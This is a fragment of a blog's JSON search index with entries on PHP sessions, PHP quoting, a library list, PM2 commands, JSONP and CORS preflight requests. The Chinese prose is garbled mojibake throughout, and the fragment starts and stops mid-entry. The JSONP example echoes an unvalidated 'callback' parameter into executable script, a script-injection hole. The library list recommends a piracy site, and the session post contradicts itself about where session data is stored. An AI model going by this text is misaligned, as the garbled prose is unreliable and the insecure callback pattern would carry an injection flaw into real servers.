æ–¹æ³•","text":"ç°¡å–®å¿«é€Ÿã€‚ ç°¡è¿°åœ¨å¯¦ä½œç™»å…¥åŠŸèƒ½æ™‚éœ€è¦ç”¨åˆ° session æ©Ÿåˆ¶ä¾†è™•ç† HTTP çš„ç„¡ç‹€æ…‹å•é¡Œã€‚ç¬¬ä¸€ç¨®æ–¹æ³•æ˜¯è‡ªå·±é–‹ä¸€å€‹è³‡æ–™åº«ä¾†å»ºç«‹ token æ©Ÿåˆ¶ï¼Œç¬¬äºŒç¨®æ–¹æ³•æ˜¯ç”¨ PHP æä¾›çš„å…§å»ºæ–¹æ³•ï¼Œå¾Œè€…æœƒæ›´æ–¹ä¾¿ä¸€é»ã€‚ é—œæ–¼æ‰‹åš token çš„æ–¹å¼å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šç•¶ Cookie è¢«ç«„æ”¹æœƒæ€éº¼æ¨£ï¼Ÿ ä½¿ç”¨æ–¹å¼é€™è£¡ç°¡å–®å¯«å€‹ç¨‹å¼ç¢¼ï¼Œè…¦è¢‹æœ‰å€‹ç•«é¢å°±å¥½ã€‚ å‚™è¨»ï¼šæ¯æ¬¡è¦ç”¨ session çš„åŠŸèƒ½éƒ½è¦è¨˜å¾—å…ˆ session_start() æ‰ä¸æœƒå‡ºéŒ¯ã€‚ 123456789// pageA.php&lt;?php // å»ºç«‹ä¸€å€‹ session session_start(); // è¨­å®šè¦å„²å­˜çš„ key èˆ‡ value $_SESSION['username'] = 'PeaNu';?&gt;// åˆ°é é¢ B çš„ç¶²å€&lt;a href=\"./pageB.php\"&gt;åˆ°é é¢ B&lt;/a&gt; æ¥è‘—åˆ°é é¢ B å°±å¯ä»¥å–å¾—åœ¨ é é¢ A å„²å­˜çš„ sessionï¼š 12345// pageB.php&lt;?php session_start(); echo $_SESSION['username']; // 'PeaNu'?&gt; å¦‚æœè¦åˆªé™¤ session å¯ä»¥é€™æ¨£å­ï¼š 1234567// delete_session.php&lt;?php session_start(); // åˆªé™¤ session session_destroy(); header(\"Location: ./pageB.php\");?&gt; é€™æ™‚å€™é é¢ B å°±å­˜ä¸åˆ° $_SESSION['username'] çš„å€¼äº†ã€‚ åŸç†ç°¡è¿°å…¶å¯¦èƒŒå¾Œçš„åŸç†ä¸€æ¨£æ˜¯é€é cookieï¼Œåªæ˜¯å…§å»ºçš„æ–¹æ³•æœƒåœ¨ä½ çš„é›»è…¦è£¡å»ºç«‹ä¸€å€‹ session æª”æ¡ˆï¼ŒæŠŠè¦å„²å­˜çš„å…§å®¹å¯«åœ¨è£¡é¢ã€‚ é™„è¨»ï¼šç²¾ç¢ºä¸€é»ä¾†èªªæ˜¯å­˜åœ¨è¨˜æ†¶é«”ï¼Œæ‰€ä»¥é›»è…¦é—œæ©Ÿå¾Œå°±æœƒæ¶ˆå¤±äº†ã€‚ ; åœ¨ xampp åº•ä¸‹æœ‰å€‹ tmp çš„è³‡æ–™å¤¾ï¼šå¯ä»¥åœ¨è£é ­æ‰¾åˆ°å°æ‡‰çš„ session æª”æ¡ˆï¼š 123456789â”€â”€â”€tmp â”œâ”€â”€â”€ibE87C â”œâ”€â”€â”€ibE87D â”œâ”€â”€â”€ibE87E â”œâ”€â”€â”€ibE88F â”œâ”€â”€â”€sess_8oadq07ei2b8g25muckbpfjs8n â”œâ”€â”€â”€sess_924h1hulv8fmfqkao4bj05249u =&gt; å°±æ˜¯å®ƒå›‰ï¼ â”œâ”€â”€â”€sess_gukpo79ueg96nfld2mj5jo2sql â”œâ”€â”€â”€why æŠŠå®ƒæ‰“é–‹å°±æœƒçœ‹åˆ°å…§å®¹ï¼š 1username|s:5:\"peanu\"; è£œä¸€ä¸‹ä»¥å‰æ²’æœ‰è¬›æ¸…æ¥šçš„åœ°æ–¹ã€‚ é›–ç„¶æˆ‘ä¸Šé¢èªª session æ˜¯åœ¨ä½ çš„é›»è…¦è£¡å»ºç«‹ä¸€å€‹æª”æ¡ˆä¾†å„²å­˜ï¼Œä½†è¦æ³¨æ„é€™å¥è©±æ˜¯å»ºç«‹åœ¨ã€Œä½ çš„é›»è…¦å±¬æ–¼ Server ç«¯ã€çš„æƒ…æ³ä¸‹æ‰æˆç«‹ã€‚ å†é‡ç”³ä¸€æ¬¡ï¼š Client ç«¯å„²å­˜çš„æ˜¯ session_idï¼š924h1hulv8fmfqkao4bj05249u Server ç«¯å„²å­˜çš„æ˜¯ session_id å°æ‡‰åˆ°çš„å€¼ï¼šusername:\"peanu\" æ‰€ä»¥ï¼Œä»Šå¤©ä½ åˆ°ä¸€å€‹æœ‰ session æ©Ÿåˆ¶çš„ç¶²é ï¼Œæœƒå„²å­˜åœ¨ä½ é›»è…¦è£¡çš„æ˜¯ session_idï¼ˆé€é cookie ä¿å­˜ï¼‰ï¼Œä¸æ˜¯ username:\"peanu\"ï¼ŒçœŸæ­£çš„è³‡æ–™æ˜¯å„²å­˜åœ¨ Server é‚£é‚Šçš„ï¼Œä¸æ˜¯ clientï¼Œä¸è¦æéŒ¯äº†ã€‚ å¦å¤–è¦è£œå……çš„æ˜¯ï¼Œåœ¨åŸ·è¡Œ session_destroy() æ™‚ï¼ŒæœƒæŠŠ tmp å„²å­˜çš„ session è³‡æ–™çµ¦åˆªé™¤ï¼Œé€™æ™‚å€™ $_SESSION å°±è®€ä¸åˆ°ä»»ä½•è³‡æ–™ï¼Œé›–ç„¶ application è£¡é‚„æ˜¯æœƒä¿ç•™ PHPSESSID é€™å€‹ cookieã€‚","link":"/2022/02/07/php-session/"},{"title":"PHP ä¸­å–®å¼•è™Ÿèˆ‡é›™å¼•è™Ÿçš„å·®åˆ¥","text":"ä¸€å€‹å°å°çš„å†·çŸ¥è­˜ã€‚ ç°¡è¿°ç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 12345&lt;?php $name = 'PeaNu'; echo \"My name is $name\"; echo 'My name is $name'; ?&gt; Outputï¼š 12My name is PeaNu;My name is $name; æœ‰æ³¨æ„åˆ°å—ï¼Ÿåœ¨å–®å¼•è™Ÿçš„æ™‚å€™è®Šæ•¸æœƒè¢«ç•¶æˆã€Œå­—ä¸²ã€ï¼Œé›™å¼•è™Ÿçš„æ™‚å€™è®Šæ•¸å€¼æœƒè¢«ã€Œè§£æã€ï¼Œé€™å°±æ˜¯å…©è€…çš„å·®ç•°ã€‚ æ‰€ä»¥ç¶²è·¯ä¸Šèªªå–®å¼•è™Ÿæœƒè®“ PHP è·‘çš„æ¯”è¼ƒå¿«å°±æ˜¯å› ç‚ºé€™æ¨£ï¼Œå› ç‚ºå–®å¼•è™Ÿçš„æ™‚å€™ä¸ç”¨åšã€Œè§£æã€é€™ä»¶äº‹ã€‚ å“ªå€‹æ¯”è¼ƒå¥½ï¼Ÿåœ¨å¤§éƒ¨åˆ†æƒ…æ³å…¶å¯¦å·®ç•°ä¸å¤§ï¼Œä¸»è¦æ˜¯åœ¨ SQL èªå¥ï¼Œä¾‹å¦‚ï¼š 123&lt;?php $sql = \"INSERT INTO users(`name`, `gender`) VALUES ('PeaNu', 'Man')\";?&gt; åœ¨ Value å€¼çš„éƒ¨åˆ†åŸæœ¬çš„ MySQL åªèªå¾—ã€Œå–®å¼•è™Ÿã€ï¼Œä¸éå¾Œä¾† MySQL æœ‰é‡å°é›™å¼•è™Ÿçš„éƒ¨åˆ†åšæ“´å±•æ”¯æ´ï¼Œæ‰€ä»¥ä¹Ÿä¸æ˜¯ä»€éº¼å¤ªå¤§çš„å•é¡Œï¼Œä½†é‚„æ˜¯è¦çŸ¥é“éå»æœ‰é€™å€‹å•é¡Œã€‚","link":"/2022/02/05/php-single-or-double-quotes/"},{"title":"å¥—ä»¶å¤§ç¸½åŒ¯","text":"æŠŠä¸€äº›æˆ‘è¦ºå¾—é‚„ä¸éŒ¯çš„å¥—ä»¶çµ¦é›†åˆèµ·ä¾†ã€‚ ICON Material-Icon Google çš„ Icon heroicons è¤‡è£½è²¼ä¸Šå³å¯ç”¨çš„ Icon iconmonstr è¤‡è£½è²¼ä¸Šå³å¯ç”¨çš„ SVG fontawesomeicons è¤‡è£½è²¼ä¸Šå³å¯ç”¨çš„ SVG CSS Ant Design åšå¾Œå°ç³»çµ±å¾ˆæœ‰åçš„ UI library chakra-u çœ‹èµ·ä¾†é‚„ä¸éŒ¯çš„ UI library mui ç”¨é React çš„æ‡‰è©²éƒ½çŸ¥é“ Tocas UI æˆ‘è¦ºå¾—å¾ˆèˆ’æœçš„ UI library Milligram æä¾›è¼•é‡ã€èˆ’æœçš„ç¾æˆæ¨£å¼ Bootstrap5 é€™å€‹å¤§å®¶æ‡‰è©²éƒ½çŸ¥é“ï¼Œä½†é‚„æ˜¯è²¼ä¸€ä¸‹ã€‚ Bootstrap5-Examples å¯ä»¥åƒè€ƒçš„ BS ç¯„ä¾‹ï¼Œé‚„ä¸éŒ¯ã€‚ Bootswatch å¿«é€Ÿæ‰“é€ ä¸åŒçš„ BS ä¸»é¡Œ Flex-Cheatsheet å¿«é€ŸæŸ¥ Flex å±¬æ€§ Grid-Cheatsheet å¿«é€ŸæŸ¥ Grid å±¬æ€§ Animista - CSS Animations on Demand CSS å‹•ç•«ç·šä¸Š Demo convertacolor å¿«é€Ÿè½‰æ›é¡è‰²æ ¼å¼ Box Shadow CSS Generator é™°å½±è£½é€ å™¨ color-gradient è£½ä½œæ¼¸å±¤èƒŒæ™¯ fontawesome fontawesome v5 ç‰ˆæœ¬ animista é–‹ç®±å³ç”¨çš„å„ç¨® CSS å‹•ç•« Node.js request è®“ä½ åœ¨ Node.js ä¸Šç™¼å‡º request dotenv è®€å–ç’°å¢ƒè®Šæ•¸ï¼Œå¥½ç”¨ï¼ jest FB é–‹æºå‡ºä¾†çš„ unit test çš„å¥—ä»¶ bcrypt å­˜å¯†ç¢¼æœƒç”¨åˆ°çš„é›œæ¹Šå‡½å¼ pm2 ä¸€å€‹å¹«ä½ åœ¨èƒŒæ™¯è·‘ process çš„çŒ›å¥—ä»¶ node-fetch åœ¨ Node.js ä¸Šç”¨ fetch JavaScript convertsimple æŠŠ JS è½‰æˆ JSON æ ¼å¼ highlightjs ç¨‹å¼ç¢¼é«˜äº®æ¨£å¼ highlightjs-line-numbers.js å¹« highlightjs åŠ ä¸Šè¡Œæ•¸çš„å¥—ä»¶ you-might-not-need-jquery å¥½ç”¨çš„ JavaScript æ‡¶äººåŒ… jQuery Quick API Reference jQuery å¿«é€ŸæŸ¥è¡¨ regex101 æ¸¬è©¦ RegExp çš„åŒ¹é…å°è±¡ï¼Œå¾ˆæ–¹ä¾¿çš„ç¶²ç«™ï¼ Manage HTML DOM æ“ä½œ DOM çš„ cheet sheet CKEditor 5 å¼·å¤§çš„æ–‡å­—ç·¨è¼¯å™¨ Event queue Event loop çš„ Demo ç¶²ç«™ jquery-loading è¼•é¬†åšå‡º loading æ•ˆæœï¼ momentjs æ“ä½œ Date çš„å¥½å¹«æ‰‹ï¼ˆå·²åœæ­¢ç¶­è­·ï¼‰ dayjs æ“ä½œ Date çš„å¥½å¹«æ‰‹ date-fns ä¸€æ¨£è·Ÿæ—¥æœŸæœ‰é—œï¼ˆæœ€å²å®³çš„æ‡‰è©²æ˜¯è¨ˆç®—æ™‚é–“é–“éš”çš„åŠŸèƒ½ï¼‰ greensock ä¸æƒ³å¯«ç”¨ CSS å¯«å‹•ç•«ï¼Ÿè©¦è©¦çœ‹é€™å€‹å§ swiperjs æåˆ°å¹»ç‡ˆç‰‡æ™‚æœ€å¸¸å‡ºç¾çš„åå­— echarts é–‹ç®±å³ç”¨çš„åœ–è¡¨å·¥å…· pdf.js æŠŠ pdf è½‰æˆ canvas jspdf è¼¸å‡º pdf çš„å·¥å…· fabric.js è®“ canvas æ›´å¥½æ“ä½œçš„å·¥å…· React React-loading-overlay åœ¨ React ä¸Šç”¨çš„è¼‰å…¥æ•ˆæœ react-md-editor å¾ˆå¥½ç”¨çš„ markdown ç·¨è¼¯å™¨ classnames ç®¡ç† class name çš„å¥½æ±è¥¿ formik è¡¨å–®è™•ç†çš„å°å¹«æ‰‹ yup è¡¨å–®é©—è­‰çš„å°å¹«æ‰‹ react-card-flip å¡ç‰‡ç¿»è½‰æ•ˆæœï¼Œæ–¹ä¾¿ï¼ React Icons å¿…å‚™çš„ icon ç¥å™¨ @tanem/react-nprogress è¦ºå¾—å®˜æ–¹æ–‡ä»¶å¾ˆå„ªç§€çš„é€²åº¦æ¢æ•ˆæœ spinners-react ç°¡å–®ã€è¼•é‡ã€å¥½ç”¨çš„ Spinner React Select æ–¹ä¾¿è™•ç† SelectBox çš„å¥—ä»¶ notistack å½ˆè·³é€šçŸ¥å¥½å¹«æ‰‹ idle-timer é å®ƒä¾†åšé–’ç½®ç™»å‡ºçš„åŠŸèƒ½ react-loader-spinner æ¼‚äº®çš„ loadingï¼ˆä¸€ï¼‰ react-spinners æ¼‚äº®çš„ loadingï¼ˆäºŒï¼‰ React Native react-native-vector-icons Icon å¿…è£ react-native-bouncy-checkbox å°æ¸…æ–°çš„ checkboxï¼ react-native-google-places-autocomplete google æœå°‹åœ°å€ç¥å™¨ React Native Elements UI åº«~ lottie-react-native å¾ˆå²å®³çš„å‹•ç•«åœ–æ¡ˆ CDN jQuery å°±æ˜¯ jQuery font-awesome å¥½ç”¨çš„ font-awesome CDN moment.js æ“ä½œ Date çš„å¥½å¹«æ‰‹ MySQL Visual JOIN è¦–è¦ºåŒ–çš„ SQL join èªæ³• API mocky éå¸¸å¥½ç”¨çš„è‡ªè£½ API reqres å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¹Ÿå¾ˆç°¡æ½”çš„ API restcountries æŸ¥è©¢åœ‹å®¶è³‡æ–™çš„ API Twitch API å°±æ˜¯ Twitchï¼Œä½†å®ƒçš„ API æ–‡ä»¶å¯¦åœ¨æœ‰é»é›œï¼Œæ‰€ä»¥è²¼åœ¨é€™æ¯”è¼ƒæ–¹ä¾¿æŸ¥é–±ã€‚ picsum å‡åœ–ç”¢ç”Ÿ API gorest æ¸¬è©¦ç”¨ API bigdatacloud å¯ä»¥ç”¨ç¶“ç·¯åº¦æŸ¥åœ°å€çš„ APIï¼ˆç¸£å¸‚ / å€åŸŸï¼‰ yelp é¤å»³ç›¸é—œçš„ API åœ–ç‰‡ Pexels åœ–ç‰‡ç´ æ pixabay åœ–ç‰‡ç´ æ unDraw MTR04 å®˜ç¶²çš„åœ–ç‰‡ç´ æ loading-svg ä¸€äº›å…è²» loading SVG åœ–ç‰‡ã€‚ å…¶ä»– frontend tools å‰ç«¯å¤§é›†çµï¼ï¼Ÿ DirtyMarkup æŠŠå£“ç¸®éå¾Œçš„åŸå§‹ç¢¼æ‰“å›åŸå½¢ jsonlint æª¢æŸ¥ JSON æ ¼å¼æ˜¯å¦åˆæ³• OG åˆ†äº«åµéŒ¯å·¥å…· æª¢æŸ¥ SEO çš„ OG æ•ˆæœ Color Hunt éœ€è¦é¡è‰²ä¸Šçš„éˆæ„Ÿå—ï¼Ÿä¾†é€™è£¡å§ï¼ Colors æ‰¾å–®ä¸€é¡è‰²çš„è©±åƒè€ƒé€™è£¡ Apache JMeter ç”¨ä¾†å° server åšå£“åŠ›æ¸¬è©¦çš„å¥½å·¥å…· chmod è¨ˆç®—æ©Ÿ Linux çš„æ¬Šé™è¨­å®šã€‚æ‡¶å¾—è‡ªå·±ç®—çš„è©±å¯ä»¥åƒè€ƒé€™è£¡ stackblitz è·Ÿ Codesandbox å·®ä¸å¤šçš„æ±è¥¿ prettier VS Code æ’ç‰ˆå¿…å‚™ whiteboardfox ç·šä¸Šç•«åœ–çš„å¥½æ±è¥¿ sketchpad æ›´å¥½ç”¨çš„ç·šä¸Šç•«æ¿ snappify å¹«ä½ çš„ code æ‹å‡ºç¾é¡ç§€ç§€ tree generator ç·šä¸Šç”¢ç”Ÿè³‡æ–™å¤¾çµæ§‹æ–‡å­— Z-library æ²’éŒ¢è²·åŸæ–‡æ›¸çš„å¥½ç¶²ç«™","link":"/2022/01/06/plugin-collection/"},{"title":"PM2 åŸºæœ¬æŒ‡ä»¤","text":"æ‡¶äººåŒ…ã€‚ åŸºæœ¬æŒ‡ä»¤ pm2 ls ç¾åœ¨è·‘èµ·ä¾†çš„ Process pm2 start app.js åŸ·è¡Œæ‡‰ç”¨ç¨‹å¼ pm2 stop &lt;id&gt; æš«åœæ‡‰ç”¨ç¨‹å¼ pm delete &lt;id&gt; åˆªé™¤æ‡‰ç”¨ç¨‹å¼ pm2 restart &lt;id&gt; é‡æ–°å•Ÿå‹•æ‡‰ç”¨ç¨‹å¼ pm2 log &lt;id&gt; æ‡‰ç”¨ç¨‹å¼çš„ log pm2 info &lt;id&gt; æ‡‰ç”¨ç¨‹å¼çš„è©³ç´°è³‡è¨Š","link":"/2022/04/06/pm2-commands/"},{"title":"å¯¦ä½œ JSONP","text":"æ™‚ä»£çš„çœ¼æ·šï¼Ÿ åŸç†ç°¡è¿°åˆ©ç”¨ &lt;script&gt; çš„ src=\"...\" å¯ä»¥è·¨ç¶²åŸŸå­˜å–è³‡æ–™çš„ç‰¹æ€§ï¼Œæ­é… callback function ä¾†å¯¦ç¾è·¨åŸŸè«‹æ±‚çš„æŠ€è¡“ã€‚ è¦æ³¨æ„çš„æ˜¯ JSONP åªèƒ½æ‡‰ç”¨åœ¨ GETï¼Œæ²’è¾¦æ³• POSTï¼Œå› ç‚ºåªæœ‰ GET æœƒé€éç¶²å€å¸¶è³‡æ–™çµ¦å¾Œç«¯ï¼ˆå¯ä»¥åƒè€ƒé€™è£¡ï¼‰ æ¥ä¸‹ä¾†æˆ‘æœƒåˆ†åˆ¥å¯¦ä½œã€Œå¾Œç«¯ã€è·Ÿã€Œå‰ç«¯ã€å¯¦éš›åœ¨ä½¿ç”¨ JSONP çš„æ™‚å€™æœƒæ€éº¼åšè¨­å®šã€‚ å¾Œç«¯è©²åšçš„äº‹å¤§è‡´çš„æ€è·¯æ˜¯é€™æ¨£ï¼š æº–å‚™å¥½è¦çµ¦å‰ç«¯çš„è³‡æ–™ å–å¾— url ä¸­çš„ query å­—ä¸² æ ¹æ“š query å›å‚³å°æ‡‰çš„å…§å®¹ï¼ˆå…¶å¯¦å°±æ˜¯åŸ·è¡Œä¸€å€‹ functionï¼Œè®“å‰ç«¯å¯ä»¥é€é function è£¡çš„åƒæ•¸æ‹¿åˆ°è³‡æ–™ï¼‰ 12345678910111213141516171819202122// å»ºç«‹ server çš„æ¨¡çµ„const http = require('http')// è§£æ url çš„æ¨¡çµ„const url = require('url');// è¦å‚³çµ¦å‰ç«¯çš„è³‡æ–™ï¼ˆç‰©ä»¶ï¼‰const data = { name: 'PeaNu', age: 23}// ä¼ºæœå™¨è¨­å®šconst server = http.createServer((req, res) =&gt; { // è§£æ url =&gt; {callback: 'getUser'} const queryObject = url.parse(req.url, true).query // å­˜å– callback å±¬æ€§ =&gt; 'getUser' const yourFunction = queryObject.callback // æŠŠè³‡æ–™å‚³å…¥ï¼ˆè¨˜å¾—è¦è½‰æˆç´”å­—ä¸²ï¼‰ =&gt; getUser(data) res.write(`${yourFunction}(${JSON.stringify(data)})`) // é€å‡º response res.end()})// è½ 5000 é€™å€‹ portserver.listen(5000) å‰ç«¯è©²åšçš„äº‹å¤§è‡´çš„æ€è·¯æ˜¯é€™æ¨£ï¼š å»ºç«‹ä¸€å€‹ç”¨ä¾†æ¥æ”¶è³‡æ–™çš„ functionï¼ˆgetUserï¼‰ é–‹ä¸€å€‹ &lt;script&gt; ç”¨ src å‘ä¼ºæœå™¨ç™¼å‡ºè«‹æ±‚ï¼Œä¸¦å¸¶ä¸Š callback åƒæ•¸ä¾†å°æ‡‰åˆ°ç¬¬ä¸€æ­¥è¨­å¥½çš„ function é€™è£¡è¦ç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹é †åºï¼šå…ˆå®šç¾© function =&gt; ç™¼å‡º request ä¸ç„¶åœ¨ç™¼ request çš„æ™‚å€™ function æ ¹æœ¬å°±é‚„æ²’è¢«å®šç¾©ï¼Œå°±ç­‰è‘—åƒ errorã€‚ å‚™è¨»ï¼šé™¤éä½ è¨­å®š &lt;script asnyc&gt; å¼·åˆ¶è½‰æˆéåŒæ­¥ï¼Œä¸ç„¶å°±ä¸€å®šè¦æŒ‰ç…§ä¸Šé¢çš„é †åºã€‚ 12345678&lt;script&gt;// åœ¨é€™è£¡å®šç¾©å¥½è¦æ¥æ”¶è³‡æ–™çš„ functionfunction getUser(data) { console.log(data)}&lt;/script&gt;&lt;!-- é€™è£¡å®šç¾© callback åƒæ•¸çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ function --&gt;&lt;script src=\"http://localhost:5000/callback=getUser\"&gt;&lt;/script&gt; å¦‚æœé †åˆ©çš„è©±ï¼Œæœ€å¾Œå°±èƒ½æˆåŠŸæ‹¿åˆ°è³‡æ–™ï¼š å‚™è¨»åœ¨é€™è£¡ç´€éŒ„ä¸€ä¸‹å¯¦ä½œæ™‚ç¢°åˆ°çš„å•é¡Œã€‚ æœ¬ä¾†æˆ‘æ˜¯æƒ³åˆ†æˆï¼š å¦‚æœæœ‰å¸¶ä¸Š callback åƒæ•¸ï¼Œå¾Œç«¯å°± å›å‚³å°æ‡‰çš„ function å¦‚æœæ²’æœ‰å¸¶åƒæ•¸ï¼Œå¾Œç«¯å°± å›å‚³ç´”å­—ä¸²çš„ JSON è³‡æ–™ æ‰€ä»¥å¾Œç«¯çš„éƒ¨åˆ†è¨­å®šæˆé€™æ¨£ï¼š 12345678910111213141516171819// ä¼ºæœå™¨è¨­å®šconst server = http.createServer((req, res) =&gt; { // {callback: 'getUser'} const queryObject = url.parse(req.url, true).query // 'getUser' const yourFunction = queryObject.callback // æª¢æŸ¥å‰ç«¯æœ‰æ²’æœ‰å¸¶ä¸Š callback åƒæ•¸ if(yourFunction) { // æŠŠè³‡æ–™å‚³å…¥ =&gt; getUser(data) res.write(`${yourFunction}(${JSON.stringify(data)})`) // é€å‡º response res.end() } else { // å›å‚³ JSON è³‡æ–™ res.write(JSON.stringify(data)) // é€å‡º response res.end() }}) åœ¨æœ‰å¸¶ä¸Š callback åƒæ•¸çš„æ™‚å€™æ²’æœ‰å•é¡Œï¼Œä½†æ˜¯æ²’æœ‰çš„æ™‚å€™å°±æœƒå‡ºç¾ CORB çš„éŒ¯èª¤ï¼š æœ¬ä¾†ä»¥ç‚ºæ˜¯å›å‚³å…§å®¹çš„å•é¡Œï¼Œæ‰€ä»¥æˆ‘åˆæŠŠ res.write(JSON.stringify(data)) æ”¹æˆ res.write('hi')ï¼š ç°¡å–®ä¾†èªªï¼Œå¦‚æœä½ æƒ³è¦ç”¨é€™ç¨®å¡åœ¨ &lt;script&gt; è£¡é¢çš„æ–¹å¼ä¾†å‚³ JSON è³‡æ–™ï¼Œé‚£å°± ä¸€å®šè¦ç”¨ JSONP ä¾†å‚³ï¼Œä¸ç„¶ç€è¦½å™¨æœƒæŠŠ response çµ¦æ“‹ä¸‹ä¾†ã€‚ è‡³æ–¼ç¬¬äºŒå€‹ res.write('hi') çš„çµæœä¹Ÿå‘Šè¨´æˆ‘å€‘ï¼Œå¦‚æœä¸æ˜¯ JSON è³‡æ–™çš„è©±å°±æ²’é—œä¿‚ï¼Œä½†æ˜¯é€™æ¨£å°±æ²’æœ‰ä»€éº¼æ„ç¾©äº†ï¼Œå› ç‚ºç­‰æ–¼å‰ç«¯åªæ‹¿åˆ°ä¸€å€‹è£¡é¢å¯«äº† hi çš„ js æª”æ¡ˆï¼Œæ‰€ä»¥æœ€å¾ŒåŸ·è¡Œé€™å€‹æª”æ¡ˆçš„æ™‚å€™æ‰æœƒå™´ Uncaught ReferenceErrorã€‚","link":"/2022/01/06/practice-jsonp/"},{"title":"è¢«éºå¿˜çš„ Preflight request","text":"é™¤äº† CROS ä»¥å¤–ï¼Œé€™ä¹Ÿå¾ˆé‡è¦ã€‚ ç°¡è¿°å¦‚æœåªè€ƒæ…®ã€ŒåŒæºæ”¿ç­–ã€çš„è©±ï¼Œé‚£ä¸‹é¢é€™å¥è©±å°±èƒ½æˆç«‹ï¼š ç€è¦½å™¨ä¸è«–å¦‚ä½•éƒ½æœƒå¹«ä½ ç™¼ requestï¼Œåªæ˜¯æœƒæŠŠ response æ“‹ä½ã€‚ é€™æ­£æ˜¯æˆ‘ä»¥å‰çš„èªçŸ¥ã€‚ä½†æˆ‘ä¸€ç›´å¿½ç•¥äº†ä¸€å€‹æ±è¥¿ï¼Œé‚£å°±æ˜¯é™¤äº†åŒæºæ”¿ç­–ä»¥å¤–ï¼Œé‚„æœ‰å€‹æ±è¥¿å«åšã€ŒPreflight requestã€ï¼Œä¸­æ–‡ç¿»ä½œã€Œé æª¢è«‹æ±‚ã€ã€‚ é€™å€‹æ±è¥¿æœƒæ”¹è®Šä¸Šé¢èªªçš„è«–é»ï¼Œæ‰€ä»¥ç­‰ä¸€ä¸‹æœƒè§£é‡‹ï¼š ä»€éº¼æ˜¯ Preflight requestï¼Ÿ ç‚ºä»€éº¼éœ€è¦ Preflight requestï¼Ÿ é—œæ–¼ Preflight requestç°¡å–®ä¾†èªªï¼ŒPreflight request çš„ç”¨é€”å°±æ˜¯ã€Œå¹«ä½ å• Server é€™å€‹ request ä»–æ¥ä¸æ¥å—ï¼Ÿã€ã€‚ ä¾‹å¦‚èªªï¼Œåœ¨æˆ‘ä¸² Twitch API çš„æ™‚å¾Œè¦ç™¼ä¸€å€‹ request å»å–å¾—éŠæˆ²è³‡è¨Šï¼Œå‡ºä¾†çš„çµæœé•·é€™æ¨£ï¼š è£¡é¢çš„å…§å®¹æ˜¯ï¼š æœƒç™¼ç¾ç¨®é¡æ˜¯ OPTIONSï¼Œå®ƒçš„ç”¨é€”æ˜¯å• Server æ¥æ”¶å“ªäº›è«‹æ±‚ï¼Œæ‰€ä»¥æˆ‘å€‘å†ä¾†çœ‹ Server æ˜¯æ€éº¼å›çš„ï¼š å¦‚æœæˆ‘æƒ³å¾—æ²’éŒ¯çš„è©±ï¼Œæ‡‰è©²å°±æ˜¯å¾ä¸Šé¢é‚£å¹¾å€‹æ±è¥¿ä¾†æ±ºå®šè¦ä¸è¦é€å‡ºä¸‹ä¸€å€‹ requestï¼š access-control-allow-headers æ¥å—å“ªäº› header access-control-allow-methods æ¥å—å“ªäº› HTTP Methods access-control-allow-origin æ¥å—å“ªäº›ä¾†æº ç¸½ä¹‹å‘¢ï¼Œåªè¦é€™éšæ®µæ²’éçš„è©±ï¼Œä¸‹å€‹ request å°±ä¸æœƒç™¼å‡ºå»äº†ã€‚é€™ä¸€é»å¾ˆé‡è¦ï¼Œè«‹å‹™å¿…éŠ˜è¨˜åœ¨å¿ƒã€‚ ç‚ºä»€éº¼éœ€è¦ Preflight requestä½ ä»”ç´°æƒ³æƒ³å°±æœƒç™¼ç¾ã€Œåªæœ‰åŒæºæ”¿ç­–ã€æ˜¯ä¸å¤ çš„ï¼Œç‚ºä»€éº¼ï¼Ÿ å‡è¨­ä»Šå¤©æœ‰å€‹ API æ˜¯é€éå° https://example.com/data/:id ç™¼å‡ºä¸€å€‹ request ä¾†åˆªé™¤è³‡æ–™ï¼Œæœƒæœ‰ä¸€å€‹å•é¡Œï¼šä»»ä½•äººéƒ½å¯ä»¥ç™¼ request ä¾†åˆªæ±è¥¿ã€‚ ç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿå› ç‚ºåŒæºæ”¿ç­–çš„æ©Ÿåˆ¶æ˜¯ã€Œå°±ç®—ä¸åŒæºä¹Ÿä¸€æ¨£æœƒå¹«ä½ ç™¼ requestï¼Œåªæ˜¯æœƒæ“‹æ‰ responseã€ï¼Œæ„æ€æ˜¯èªªä¸ç®¡æœ‰æ²’æœ‰é–‹ CROS é€™ä»½ request éƒ½æœƒé€å‡ºå»ï¼Œåªæ˜¯æ‹¿ä¸åˆ° response è€Œå·²ï¼Œä½†æ–‡ç« é‚„æ˜¯è¢«åˆªé™¤äº†ã€‚ Preflight request å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œçš„ï¼Œå®ƒä¸å¸Œæœ›ä»»ä½•äººéƒ½èƒ½è·¨ä¾†æºç™¼ requestã€‚ ä»€éº¼æ™‚å€™æœƒè§¸ç™¼ Preflight requesté¦–å…ˆè¦çŸ¥é“ï¼ŒCROS æœƒæŠŠ request åˆ†æˆå…©ç¨®ï¼š ç°¡å–®è«‹æ±‚ éç°¡å–®è«‹æ±‚ åªè¦æ˜¯éç°¡å–®è«‹æ±‚ï¼Œå°±æœƒè§¸ç™¼ Preflight requestï¼Œå¿…é ˆç­‰åˆ°é€šéå¾Œæ‰æœƒå¹«ä½ ç™¼ requestã€‚ é‚£ä»€éº¼æ˜¯éç°¡å–®è«‹æ±‚ï¼Ÿè©³ç´°çš„å®šç¾©è »è¤‡é›œçš„ï¼Œå¯ä»¥åƒè€ƒ MDNã€‚ ç¸½ä¹‹å‘¢ï¼Œåªè¦ç¬¦åˆé€™å…©é»çš„è©±å°±ä¸€å®šæ˜¯ç°¡å–®è«‹æ±‚ï¼š ç”¨çš„æ–¹æ³•æ˜¯ GET æ²’æœ‰è‡ªå®šç¾© headerï¼ˆåƒ Twitch è¦åŠ ä¸Šé©—è­‰ token å°±ä¸ç¬¦åˆï¼‰ æ‰€ä»¥å¸¸è¦‹çš„ POST PUT DELETE é€šå¸¸éƒ½ä¸æ˜¯ç°¡å–®è«‹æ±‚ï¼Œé€™æ™‚å€™å°±æœƒé€é Preflight request å…ˆåšç¢ºèªï¼Œæ‰æ±ºå®šè¦ä¸è¦ç™¼å‡ºå»ã€‚","link":"/2022/03/15/preflight-request/"},{"title":"ç†è§£ function 